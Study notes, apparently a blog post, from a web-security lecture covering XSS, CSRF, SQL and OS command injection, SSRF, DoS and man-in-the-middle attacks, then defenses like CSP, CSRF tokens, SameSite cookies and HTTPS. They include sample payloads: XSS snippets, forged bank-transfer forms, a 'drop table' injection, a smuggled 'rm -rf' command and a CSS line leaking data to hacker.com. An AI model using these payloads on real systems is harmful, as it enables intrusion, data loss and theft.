{"title":"WEB 开发的安全之旅 - 字节青训营","date":"2022-01-26T16:00:00.000Z","date_formatted":{"ll":"Jan 27, 2022","L":"01/27/2022","MM-DD":"01-27"},"link":"learningNotes/青训营/10 刘宇晨 web 开发的安全之旅","tags":["前端安全","青训营"],"categories":["learningNotes"],"updated":"2022-01-26T16:00:00.000Z","content":"<blockquote>\n<p>两个角度看安全：hacker 攻击、开发者 防御</p>\n</blockquote>\n<h2 id=\"攻击者\">攻击者<a title=\"#攻击者\" href=\"#攻击者\"></a></h2>\n<h3 id=\"xss-—-cross-site-scripting\">XSS — Cross-Site Scripting<a title=\"#xss-—-cross-site-scripting\" href=\"#xss-—-cross-site-scripting\"></a></h3>\n<p>攻击者在网站上提交一段恶意脚本 &lt;script&gt;&lt;/script&gt; ，网站将其当成自身dom执行编译。</p>\n<ul>\n<li>\n<p>主要利用了：</p>\n<ul>\n<li>盲目信任用户提交内容</li>\n<li>把用户提交的string 直接转化为 DOM\n<ul>\n<li>document.write</li>\n<li>element.innerHTML = anyString;</li>\n<li>SSR(user_data)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>特点：</p>\n<ul>\n<li>难以从 UI 上感知，暗地执行脚本</li>\n<li>窃取用户信息 cookie/token</li>\n<li>绘制 UI 例如弹窗，诱骗用户点击 / 填写表单</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"存储型-stored-xss：\">存储型 Stored XSS：<a title=\"#存储型-stored-xss：\" href=\"#存储型-stored-xss：\"></a></h4>\n<ul>\n<li>恶意脚本被<strong>存放在数据库</strong>中</li>\n<li>访问页面 -&gt; 读数据 == 被攻击</li>\n<li>危害最大，对全部用户都可见</li>\n</ul>\n<h4 id=\"反射型-reflected：\">反射型 Reflected：<a title=\"#反射型-reflected：\" href=\"#反射型-reflected：\"></a></h4>\n<ul>\n<li>\n<p>不涉及数据库</p>\n</li>\n<li>\n<p><strong>从 URL 上攻击</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 例如 url 为 </span></span><br><span class=\"line\"><span class=\"comment\">// host/path/?param=&lt;script&gt;alert(&#x27;123&#x27;)&lt;/script&gt;</span></span><br><span class=\"line\">public <span class=\"keyword\">async</span> <span class=\"title function_\">render</span>(<span class=\"params\">ctx</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> &#123; param &#125; = ctx.<span class=\"property\">query</span>;</span><br><span class=\"line\">    ctx.<span class=\"property\">status</span> = <span class=\"number\">200</span>;</span><br><span class=\"line\">    ctx.<span class=\"property\">body</span> = <span class=\"string\">`&lt;div&gt;<span class=\"subst\">$&#123; param &#125;</span>&lt;/div&gt;`</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"基于-dom-dom-based：\">基于 dom DOM-based：<a title=\"#基于-dom-dom-based：\" href=\"#基于-dom-dom-based：\"></a></h4>\n<ul>\n<li>\n<p>不需要服务器的参与</p>\n</li>\n<li>\n<p>恶意攻击的发起 + 执行，<strong>全在浏览器完成</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 例如 url 为 </span></span><br><span class=\"line\"><span class=\"comment\">// host/path/?param=&lt;script&gt;alert(&#x27;123&#x27;)&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> content = <span class=\"keyword\">new</span> <span class=\"title function_\">URL</span>(location.<span class=\"property\">href</span>).<span class=\"property\">searchParams</span>.<span class=\"title function_\">get</span>(<span class=\"string\">&quot;param&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> div = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;div&#x27;</span>);</span><br><span class=\"line\">div.<span class=\"property\">innerHTML</span> = content;</span><br><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"property\">body</span>.<span class=\"title function_\">append</span>(div)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>与反射型很像，区别在于 完成注入脚本的地方：反射型在 server端、DOM 在浏览器完成闭环</p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"基于-mutation-mutation-based：\">基于 mutation Mutation-based：<a title=\"#基于-mutation-mutation-based：\" href=\"#基于-mutation-mutation-based：\"></a></h4>\n<ul>\n<li>\n<p>利用了浏览器渲染 DOM 的特性 – 独特优化</p>\n</li>\n<li>\n<p>不同浏览器，会有区别 – 按浏览器进行攻击</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">noscript</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">title</span>=<span class=\"string\">&quot;&lt;/noscript&gt;&lt;img src=x onerror=alert()&gt;&quot;</span>&gt;</span></span><br><span class=\"line\">// 为</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">noscript</span>&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">title</span>=<span class=\"string\">&quot; &lt;/noscript&gt;</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">    &lt;img src=&quot;</span><span class=\"attr\">x</span>&quot; <span class=\"attr\">onerror</span>=<span class=\"string\">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class=\"line\">    &quot;&quot;&quot;&gt;&quot;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"csrf-跨站伪造请求-—-cross-site-request-forgery\">CSRF 跨站伪造请求 — Cross-site request forgery<a title=\"#csrf-跨站伪造请求-—-cross-site-request-forgery\" href=\"#csrf-跨站伪造请求-—-cross-site-request-forgery\"></a></h3>\n<p>在用户不知情的前提下，利用用户权限 cookie，构造指定 HTTP 请求，窃取或修改用户铭感信息</p>\n<p>例子：银行转账</p>\n<h4 id=\"get\">GET<a title=\"#get\" href=\"#get\"></a></h4>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;https://bank.com/transfer?to=hacker&amp;amount=100&quot;</span>&gt;</span>点我抽奖<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;display:none;&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://bank.com/transfer?to=hacker&amp;amount=100&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"post\">POST<a title=\"#post\" href=\"#post\"></a></h4>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;https://bank.com/transfer_tons_of_money&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;amount&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;10000&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;to&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hacker&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">from</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"injection-注入\">Injection 注入<a title=\"#injection-注入\" href=\"#injection-注入\"></a></h3>\n<h4 id=\"sql\">SQL<a title=\"#sql\" href=\"#sql\"></a></h4>\n<p>请求：SQL 参数 恶意注入</p>\n<p>Server：运行 SQL code</p>\n<p>获取其他数据、修改数据、删除数据…</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 读取请求字段  直接以字符串的形式拼接 SQL 语句</span></span><br><span class=\"line\">public <span class=\"keyword\">async</span> <span class=\"title function_\">renderForm</span>(<span class=\"params\">ctx</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> &#123; username, form_id &#125; = ctx.<span class=\"property\">query</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> result = <span class=\"keyword\">await</span> aql.<span class=\"title function_\">query</span>(<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">\t\tselect a,b,c from table</span></span><br><span class=\"line\"><span class=\"string\">\t\twhere username = <span class=\"subst\">$&#123;username&#125;</span></span></span><br><span class=\"line\"><span class=\"string\">\t\tand form_id = <span class=\"subst\">$&#123; from_id &#125;</span></span></span><br><span class=\"line\"><span class=\"string\">\t`</span>);</span><br><span class=\"line\">    ctx.<span class=\"property\">body</span> = <span class=\"title function_\">renderForm</span>(result);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 攻击者</span></span><br><span class=\"line\"><span class=\"title function_\">fetch</span>(<span class=\"string\">&quot;/api&quot;</span>,&#123;</span><br><span class=\"line\">    <span class=\"attr\">method</span>:<span class=\"string\">&quot;POST&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">headers</span>:&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;Content-Type&quot;</span>:<span class=\"string\">&quot;application/json&quot;</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"attr\">body</span>:<span class=\"title class_\">JSON</span>.<span class=\"title function_\">stringify</span>(&#123;</span><br><span class=\"line\">        <span class=\"attr\">username</span>: <span class=\"string\">&quot;any; drop table tabelname;&quot;</span></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 造成 select xxx from xxx drop table tablename 删库跑路</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"injection-不止于-sql\">Injection 不止于 SQL<a title=\"#injection-不止于-sql\" href=\"#injection-不止于-sql\"></a></h4>\n<ul>\n<li>\n<p>CLI 命令行</p>\n</li>\n<li>\n<p>OS command 系统命令</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 视频格式转换</span></span><br><span class=\"line\">public <span class=\"keyword\">async</span> <span class=\"title function_\">convertVideo</span>(<span class=\"params\">ctx</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> &#123; video, options &#125; = ctx.<span class=\"property\">request</span>.<span class=\"property\">body</span>;</span><br><span class=\"line\">    <span class=\"title function_\">exec</span>(<span class=\"string\">`convert-cli <span class=\"subst\">$&#123; video &#125;</span> -o <span class=\"subst\">$&#123; options &#125;</span>`</span>);</span><br><span class=\"line\">    ctx.<span class=\"property\">body</span> = <span class=\"string\">&quot;ok&quot;</span>;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 攻击</span></span><br><span class=\"line\"><span class=\"title function_\">fetch</span>(<span class=\"string\">&quot;/api&quot;</span>, &#123;</span><br><span class=\"line\">    <span class=\"attr\">method</span>: <span class=\"string\">&quot;POST&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">body</span>: <span class=\"title class_\">JSON</span>.<span class=\"title function_\">stringify</span>(&#123;</span><br><span class=\"line\">        <span class=\"attr\">options</span>:<span class=\"string\">`&#x27; &amp;&amp; rm -rf xxx`</span></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 生成 删除系统文件的命令 </span></span><br><span class=\"line\"><span class=\"keyword\">const</span> command = <span class=\"string\">`convert-cli video -o &amp;&amp; rm -rf xxx`</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>除了删除还能进行 读取 修改</p>\n</blockquote>\n</li>\n<li>\n<p>Server-Side Request Forgery — ssrf，服务端伪造请求</p>\n<blockquote>\n<p>严格上说不是 injection ，但是原理类似</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 请求 用户自定义 的callback url</span></span><br><span class=\"line\"><span class=\"comment\">// web server 通常有内网访问权限</span></span><br><span class=\"line\">public <span class=\"keyword\">async</span> <span class=\"title function_\">webhook</span>(<span class=\"params\">ctx</span>)&#123;</span><br><span class=\"line\">    <span class=\"comment\">// callback 可能是内网 url </span></span><br><span class=\"line\">    <span class=\"comment\">// e.g http://secret.com/get_employ_payrolls</span></span><br><span class=\"line\">    ctx.<span class=\"property\">body</span> = <span class=\"keyword\">await</span> <span class=\"title function_\">fetch</span>(ctx.<span class=\"property\">query</span>.<span class=\"property\">callback</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 访问 callback === 暴露内网信息</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"dos-—-denial-of-service\">Dos — Denial of Service<a title=\"#dos-—-denial-of-service\" href=\"#dos-—-denial-of-service\"></a></h3>\n<p>通过某种方式 构造特定请求，导致服务器资源被显著消耗，来不及响应更多请求，导致请求挤压，进而雪崩效应</p>\n<h4 id=\"redos：基于正则表达式的-dos\">ReDos：基于正则表达式的 Dos<a title=\"#redos：基于正则表达式的-dos\" href=\"#redos：基于正则表达式的-dos\"></a></h4>\n<p>贪婪：n 次不行？n-1次再试试 — 回溯</p>\n<blockquote>\n<p>正则表达式的贪婪模式：</p>\n<p>重复匹配时 <code>?</code>  与 <code>no ?</code>  满足<code>一个即可 </code> 与 <code>尽量多</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> greedyRegExp = <span class=\"string\">&quot;/a+/&quot;</span>;  <span class=\"comment\">// 有多少匹配多少</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> nonGreedyRegExp = <span class=\"string\">&quot;/a+?/&quot;</span> <span class=\"comment\">// 有一个就可以</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> str = <span class=\"string\">&quot;aaaaa&quot;</span>;</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(str.<span class=\"title function_\">match</span>(greedyRegExp)[<span class=\"number\">0</span>]) <span class=\"comment\">//aaaaa</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(str.<span class=\"title function_\">match</span>(nonGreedyRegExp)[<span class=\"number\">0</span>]) <span class=\"comment\">//a</span></span><br></pre></td></tr></table></figure>\n</blockquote>\n<h4 id=\"logical-dos\">Logical Dos<a title=\"#logical-dos\" href=\"#logical-dos\"></a></h4>\n<ul>\n<li>耗时的同步操作</li>\n<li>数据库写入</li>\n<li>SQL join</li>\n<li>文件备份</li>\n<li>循环执行逻辑</li>\n</ul>\n<h4 id=\"ddos-—-distributed-dos\">DDos — Distributed Dos<a title=\"#ddos-—-distributed-dos\" href=\"#ddos-—-distributed-dos\"></a></h4>\n<p>短时间内，来自大量僵尸设备的请求流量，服务器不能及时完成全部请求，导致请求堆积，进而雪崩效应，无法响应新请求。</p>\n<p>特点：直接访问 IP、任意 API、消耗大量带宽</p>\n<p>demo：SYN Flood 洪水攻击：攻击者发送很多 SYN 与服务器进行连接，但是不进行确认连接，</p>\n<p>​              导致，握手没有完成， connection 不能被释放，达到最大可连接数，无法连接新请求</p>\n<h3 id=\"传输层-—-中间人攻击\">传输层 — 中间人攻击<a title=\"#传输层-—-中间人攻击\" href=\"#传输层-—-中间人攻击\"></a></h3>\n<img src = 'https://i.bmp.ovh/imgs/2022/01/3c7be4efb4995095.png' style=\"zoom: 50%;\" />\n<p>原因：</p>\n<ul>\n<li>明文传输</li>\n<li>信息篡改不可知</li>\n<li>对方身份未验证</li>\n</ul>\n<h2 id=\"防御篇\">防御篇<a title=\"#防御篇\" href=\"#防御篇\"></a></h2>\n<h3 id=\"xss\">XSS<a title=\"#xss\" href=\"#xss\"></a></h3>\n<ul>\n<li>\n<p>永远不信任用户的提交内容</p>\n</li>\n<li>\n<p>不要将用户提交内容直接转换成 DOM</p>\n</li>\n<li>\n<p>现成工具：</p>\n<ul>\n<li>前端：主流框架默认防御 xss、google-closure-library</li>\n<li>服务端 node：DOMPurify</li>\n</ul>\n</li>\n<li>\n<p>用户需求：需要动态生成 DOM，需要注意的点：</p>\n<ul>\n<li>\n<p>string 转 DOM：注意转译 new DOMParse()</p>\n</li>\n<li>\n<p>上传 svg：对其进行扫描，避免生成图片</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">alert</span>(<span class=\"string\">&quot;xss&quot;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>自定义跳转链接：要过滤，因为可以写js</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>自定义样式：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">input</span><span class=\"selector-attr\">[type=radio]</span><span class=\"selector-class\">.income-gt10k</span><span class=\"selector-pseudo\">:checked</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">url</span>(<span class=\"string\">&quot;https://hacker.com/?income=gt10k&quot;</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"csp---content-security-policy-内容安全策略\">CSP - Content Security Policy 内容安全策略<a title=\"#csp---content-security-policy-内容安全策略\" href=\"#csp---content-security-policy-内容安全策略\"></a></h3>\n<ul>\n<li>哪些源被认为是安全的</li>\n<li>来自安全源的脚本可以执行，否则直接抛错</li>\n<li>禁止 eval + inline script</li>\n</ul>\n<p>设置的方式：</p>\n<ol>\n<li>\n<p>服务器的响应头部：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Content</span>-<span class=\"title class_\">Security</span>-<span class=\"title class_\">Policy</span>: script-src <span class=\"string\">&#x27;self&#x27;</span> <span class=\"comment\">// 同源</span></span><br><span class=\"line\"><span class=\"title class_\">Content</span>-<span class=\"title class_\">Security</span>-<span class=\"title class_\">Policy</span>: script-src <span class=\"string\">&#x27;self&#x27;</span> <span class=\"attr\">https</span>:<span class=\"comment\">//domain.com //同源加 后面这个可以访问</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>浏览器 meta：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">htpp-eqiuv</span>=<span class=\"string\">&quot;Content-Security-Policy&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;script-src self&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"csrf\">CSRF<a title=\"#csrf\" href=\"#csrf\"></a></h3>\n<p>因为其是<strong>伪造请求</strong>，是<strong>异常来源</strong>，then <strong>限制请求来源</strong>，也就<strong>限制了 伪造请求</strong></p>\n<ul>\n<li>\n<p>方法</p>\n<ul>\n<li>\n<p>服务端开发人员可以通过校验 <strong>Origin (同源请求中，GET + HEAD 不发送)，Referer（更广泛应用）</strong></p>\n</li>\n<li>\n<p>token：</p>\n<p>Browser      →1. 请求页面 →            Server</p>\n<p>​                    ← 2.页面 + token ←</p>\n<p>​                     →3. 请求API+token →</p>\n<p>​                     ← 4.验证 token + 数据←</p>\n</li>\n</ul>\n<p>注意：</p>\n<ol>\n<li>要进行用户绑定</li>\n<li>要设置过期时间</li>\n</ol>\n<blockquote>\n<p>因为 请求来自合法页面，服务器接收过页面请求，服务器就可以表示</p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"csrf-—-iframe-攻击\">CSRF — iframe 攻击<a title=\"#csrf-—-iframe-攻击\" href=\"#csrf-—-iframe-攻击\"></a></h4>\n<p>因为这样就是同源的发送请求了，没办法用 Origin 限制了，</p>\n<ul>\n<li>\n<p>方法</p>\n<p>使用 响应头部：<code>X-Frame-Options:deny/sameorigin</code></p>\n<p>deny：不能访问</p>\n<p>sameorigin：同源可以访问</p>\n</li>\n</ul>\n<h4 id=\"csrf-anti-pattern\">CSRF anti-pattern<a title=\"#csrf-anti-pattern\" href=\"#csrf-anti-pattern\"></a></h4>\n<p>GET != GET + POST、明确 get、post 请求各自的功能</p>\n<blockquote>\n<p>如果写成下面的样子，攻击者很容易一石二鸟</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 将更新 获取 逻辑放到同一个 get</span></span><br><span class=\"line\">public <span class=\"keyword\">async</span> <span class=\"title function_\">getAndUpdate</span>(<span class=\"params\">ctx</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> &#123; update, id &#125; = ctx.<span class=\"property\">query</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(update)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">await</span> <span class=\"variable language_\">this</span>.<span class=\"title function_\">update</span>(update);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ctx.<span class=\"property\">body</span> = <span class=\"keyword\">await</span> <span class=\"variable language_\">this</span>.<span class=\"title function_\">get</span>(id);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"避免用户信息被携带：samesite-cookie\">避免用户信息被携带：SameSite Cookie<a title=\"#避免用户信息被携带：samesite-cookie\" href=\"#避免用户信息被携带：samesite-cookie\"></a></h4>\n<p>从根源上解决了 csrf，csrf 是利用用户权限及 cookie，去伪造自己是该用户来进行恶意操作，如果攻击者无法获取到 用户的 cookie 那就没用办法进行伪造了。</p>\n<p>sameSite 限制了 <strong>cookie domain、页面域名；</strong></p>\n<blockquote>\n<p>如果是有 cookie 依赖第三方服务的，可以设置</p>\n<p><code>Set-Cookie: SameSite=None; Secure;</code></p>\n</blockquote>\n<p>SameSite 与 CORS 对比：</p>\n<p>SameSite：Cookie 发送、domain 与 页面域名</p>\n<p>CORS：资源读写 http请求、资源域名 与 页面域名、白名单</p>\n<h4 id=\"正确防御-csrf-—-中间件\">正确防御 CSRF — 中间件<a title=\"#正确防御-csrf-—-中间件\" href=\"#正确防御-csrf-—-中间件\"></a></h4>\n<h2 id=\"injection\">Injection<a title=\"#injection\" href=\"#injection\"></a></h2>\n<h4 id=\"sql-1\">SQL<a title=\"#sql-1\" href=\"#sql-1\"></a></h4>\n<p>找到项目中查询 SQL 的地方，使用 prepared statement</p>\n<h4 id=\"beyond-sql\">beyond SQL<a title=\"#beyond-sql\" href=\"#beyond-sql\"></a></h4>\n<ol>\n<li>\n<p>最小权限原则</p>\n<p>不允许访问 sudo || root</p>\n</li>\n<li>\n<p>建立允许名单 + 过滤</p>\n<p>不允许进行 rm 这种系统操作</p>\n</li>\n<li>\n<p>对 URL 类型参数进行协议、域名、ip等限制</p>\n<p>禁止访问内网</p>\n</li>\n</ol>\n<h2 id=\"dos\">DoS<a title=\"#dos\" href=\"#dos\"></a></h2>\n<h4 id=\"regex-dos\">Regex DoS<a title=\"#regex-dos\" href=\"#regex-dos\"></a></h4>\n<ol>\n<li>进行 code review，避免出现 贪婪模式的 正则</li>\n<li>代码扫描 + 正则性能测试</li>\n<li>禁止使用用户提供的正则</li>\n</ol>\n<h4 id=\"logical-dos-1\">Logical Dos<a title=\"#logical-dos-1\" href=\"#logical-dos-1\"></a></h4>\n<ol>\n<li>不是非黑即白：有些情况只有再在请求量大到一定之后才会体现</li>\n<li>分析代码中的性能瓶颈</li>\n<li>限流</li>\n</ol>\n<h4 id=\"ddos\">DDos<a title=\"#ddos\" href=\"#ddos\"></a></h4>\n<ol>\n<li>流量治理\n<ul>\n<li>负载均衡 – 过滤</li>\n<li>api 网关 – 过滤</li>\n<li>cdn – 抗量</li>\n</ul>\n</li>\n<li>快速自动扩容 – 抗量</li>\n<li>非核心服务降级 – 抗量</li>\n</ol>\n<h2 id=\"传输层-—-防御中间人\">传输层 — 防御中间人<a title=\"#传输层-—-防御中间人\" href=\"#传输层-—-防御中间人\"></a></h2>\n<p>使用 https = http + TLS</p>\n<p>https的特性：</p>\n<ul>\n<li>可靠性：加密，非明文传输</li>\n<li>完整性：MAC 验证，禁止篡改   — 通过 验证 hash</li>\n<li>不可抵赖性：数字签名，进行身份验证  — 密码学</li>\n</ul>\n<h4 id=\"hsts---http-strict-transport-security\">HSTS - HTTP Strict-Transport-Security<a title=\"#hsts---http-strict-transport-security\" href=\"#hsts---http-strict-transport-security\"></a></h4>\n<p>将 HTTP 升级到 HTTPS</p>\n<p>设置请求头：<code>Strict-Transport-Security：max-age=3600</code></p>\n<h4 id=\"sri-—-subresource-integrity\">SRI — Subresource Integrity<a title=\"#sri-—-subresource-integrity\" href=\"#sri-—-subresource-integrity\"></a></h4>\n<p>防止 CDN 静态资源被篡改：对比 hash</p>\n<h4 id=\"feature-/-permission-policy\">Feature / Permission Policy<a title=\"#feature-/-permission-policy\" 